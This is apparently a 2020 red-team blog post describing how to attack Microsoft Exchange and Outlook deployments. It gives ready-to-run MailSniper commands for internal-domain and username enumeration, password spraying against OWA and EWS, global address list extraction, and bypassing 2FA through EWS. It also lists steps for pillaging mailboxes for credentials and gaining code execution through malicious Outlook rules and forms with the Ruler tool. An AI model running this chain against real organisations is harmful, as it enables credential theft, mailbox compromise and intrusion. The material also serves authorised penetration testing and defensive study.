---
layout: single
title: Red Teaming Exchange
date: 2020-06-16
classes: wide
tags:
  - Red Team
---

# Introduction

  - The currently supported versions are 2007, 2010, 2013 and 2016.  
  - Office 365 and Outlook.com are built on top of Exchange. Consequently, any attack we could perform against an Exchange server, can be also performed against an Office365 or Outlook.com profile.  
  - Exchange has a few remote access protocols that we can abuse:
    - Exchange Web Services (EWS). Is essentially SOAP over HTTP and is used prevalently across applications, Windows mobile devices,etc. and especially in newer versions of Exchange.  
    - Outlook Anywhere is sort of EWS predecessor, essentially RPC over HTTP or sub-protocols underneath RPC over HTTP, for example MAPI over RPC over HTTP.  
    - As of Exchange 2013, Microsoft gave up on RPC and uses straight MAPI over HTTP. Subsequently, Office365, Outlook.com and any Exchange 2013+ servers typically support direct MAPI over HTTP.  
    - Finally, there is Exchange ActiveSync (EAS), which is an older protocol using HTTP and XML. EAS is typically used for older mobile devices, since it is a high latency/low bandwidth network protocol. It can be abused to access assets that are out of our reach.   

# Functions/Components

## Autodiscover  

  - AutoDiscover is a Service used for rapidly gathering Exchange configurations, protocol support and service URLs.  
  - Usually there is a subdomain configured, possible locations are:
    - ```autodiscover.domain.com/autodiscover/autodiscover.xml```.  
    - ```mail.domain.com/autodiscover/autodiscover.xml```.   
    - ```webmail.domain.com/autodiscover/autodiscover.xml```.  
    - ```domain.com/autodiscover/autodiscover.xml```.  
  - This XML file contains what the Exchange server supports, usually locked by NTLM Auth!

## Outlook Web App  

OWA is essentially a minimal E-Mail client accessible through the internet.  

## Global Address List (GAL)   

GAL offers users, that are using Exchange from outside of the organization and don’t have an interface to Active Directory, the ability to pull down a list of all the organization’s e-mails.  

## Outlook Rules  

Actions Outlook for Windows runs automatically on incoming or outgoing messages. Triggers can be chosen as well as the actions the rule takes, for example, receiving an email from a person containing a specific keyword. Rules can be created both server (OWA, Outlook.com) and client side. Examples:  

  - Server-side: Mark an email as important.  
  - Client-side: Execute an application (based on the Outlook client).  

Client side actions: There is a hidden folder called *deferred action folder*, when the server wants the client side to perform the actions associated with a rule, it actually puts an action message in that folder, client syncs and Outlook looks in that hidden folder identifying the message with has a rule ID associated and finally it will execute the actions associated with it. This will be misused to get an initial foothold and spread the compromise.     
*Note: Rules built server-side and client-side are not 100% compatible.*

## Outlook Forms  

Outlook forms are an Outlook automation feature that provides customization capabilities to the end user. There are two interesting things from the offensive perspective:  

  1. The VBScript engine that Outlook forms use is separate from the VBA Macro script engine. So, disabling macros won’t affect.  
  2. When an Outlook form gets published into a folder, this form will be synced down to all instances of Outlook by the Exchange server. Just like Outlook rules.  

# Attacking Externally.  

## Classic Recon

  - [Fierce](https://github.com/mschwager/fierce)  
  - [Subfinder](https://github.com/subfinder/subfinder)  
  - [GOCA](https://github.com/gocaio/goca): Foca Fork in Golang   
  - [Discover](https://github.com/leebaird/discover)  
  - [theHarvester](https://github.com/laramies/theHarvester)   

## Internal Domain Recon  

  - ```Import-Module .\MailSniper.ps1```  
  - ```Invoke-DomainHarvestOWA –ExchHostname mail.domain.com –OutFile potential_domains.txt –CompanyName "Target Name"```   
  - *It should be noted that an organisation's internal domain name may also be found inside a self-signed SSL certificate.*   

## Username Enumeration  

  - ```Import-Module .\EmailAddressMangler.ps1```  
  - ```Invoke-EmailAddressMangler -FirstNamesList .\first_names.txt -LastNamesList .\last_names.txt -AddressConvention fnln | Out-File -Encoding ascii namelist.txt```  
  - ```Import-Module .\MailSniper.ps1``` --> Generate possible usernames list.  
  - ```Invoke-UsernameHarvestOWA –UserList .\username_list.txt –ExchHostname mail.domain.com –Domain the_identified_internal_domain_name –OutFile potential_usernames.txt``` --> Enumerate.  

## Password Discovery 

  - ```Import-Module .\EmailAddressMangler.ps1```  
  - ```Invoke-PasswordSprayOWA -ExchHostname mail.domain.com –UserList .\potential_usernames.txt -Password P@ssw0rd123 -Threads 15 -OutFile owa-sprayed-creds.txt``` --> Spray using single password.  
  - *Burp Suite's Intruder can be used too*  
  - ```Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt - Password Fall2016 -Threads 15 -OutFile sprayed-ews-creds.txt``` --> Same Attack against EWS.  
  - [Requests NTLM](https://github.com/requests/requests-ntlm) can be use to bruteforce too.  

## GAL Extraction  

  - ```Import-Module .\EmailAddressMangler.ps1```  
  - ```Get-GlobalAddressList -ExchHostname mail.domain.com –UserName domain\username -Password Fall2016 -OutFile global-address-list.txt```   

## 2FA Bypass  

  - *Access to OWA may be protected by 2FA but the mailbox can be accessed via EWS withouth 2FA*  
  - ```Import-Module .\MailSniper.ps1```  
  - ```Invoke-SelfSearch -Mailbox target@domain.com -ExchHostname mail.domain.com -remote``` --> Access via EWS.  
  - *Invoke-SelfSearch can also take various parameters to customize the mailbox search.*  

## Remote Compromise  

### Pillaging mailboxes for credentials/sensitive data 

Sensitive information harvesting against every mailbox. Certificates, VPN/RDP passwords, documents.

  - owaDump (--keyword option)  
  - MailSniper (Invoke-SelfSearch)  
  - EmailRaider (Invoke-MailSearch)  
  - PowerOutlook (New-DynamicOutlookTrigger.ps1 could be customized for pillaging activities)  

### Internal Phishing  

Valid credentials enable us to impersonate internal users. This means that we will have already built a trust relationship, prior to any attack. We can therefore spread the compromise via creative internal phishing activities. Various types of credentials like E-mail/VPN/RDP credentials could be gathered this way.  

### Malicious Outlook Rules  

**Start Application**
  
  - Synchronized through the exchange server  

**Run a Script**
  
  - Not Synchronized though the exchange server  
  - Can be used for stealth persistence  

**Attack Prerequisites:**  

  - Valid Credentials  
  - Exchange Service Access (RPC, MAPI or HTTP)  
  - Malicious file dropped on disk (WebDAV Share using UNC or local SMB Share if inside the network)  
  - Outlook 2016 Unpatched, otherwise use Outlook Forms.

**Use Cases & Advantages**  

  - Overcomes the local administrator privileges obstacle  
  - Overcomes network segmentation  
  - Stealthy persistence  
  - Minimal interaction with the target  

**Attack**  

  1. Create a malicious executable (EXE, HTA, BAT, LNK etc.) and host it on an open WebDAV share  
  2. Create a malicious Outlook rule using the Rulz.py script, pointing the file path to your WebDAV share  
  3. Run a local Outlook instance using the target’s credentials and import the malicious rule you created. (File – Manager Rules & Alerts – Options – Import Rules)  
  4. Send the trigger e-mail  

### Malicious Outlook Forms  

**Attack Prerequisites**  

  - Identification of valid credentials  
  - Exchange service access  
  - KB4011091 Not applied in Outlook 2016.  

**Use Cases & Advantages**  
  
  - Overcomes the local administrator privileges obstacle  
  - Overcomes network segmentation  

**Disadvantages**  

  - Some interaction with the target is required  
  - KB4011091 for Outlook 2016 seems to block VBScript in forms  

**Attack**  
With a valid set of e-mail credentials, we can create a malicious form and send a trigger e-mail by executing the following. The result will be execution of the command/code which is specified in the command.txt file.  

  - ```./ruler --email target@domain.com form add --suffix form_name --input /tmp/command.txt --send``` 

### Resources:  
  - [Hacking Corporate Em@il Systems](https://www.owasp.org/images/1/1d/Presentation.pptx)  
  - [Outlook and Exchange for the bad guys](https://www.slideshare.net/NickLanders/outlook-and-exchange-for-the-bad-guys)  
  - [MailSniper](https://github.com/dafthack/MailSniper)  
  - [EmailAddressMangler](https://github.com/dafthack/EmailAddressMangler)  
  - [OWA-Toolkit](https://github.com/johnnyDEP/OWA-Toolkit)  
  - [OwaDump](https://github.com/milo2012/owaDump.git)  
  - [EmailRaider](https://github.com/xorrior/EmailRaider)
  - [PowerOutlook](https://github.com/colemination/PowerOutlook)
  - [Rulz.py](https://gist.github.com/monoxgas/7fec9ec0f3ab405773fc)  
  - [Bat2Exe](http://www.f2ko.de/en/b2e.php)  
  - [Ruler](https://github.com/sensepost/ruler)  
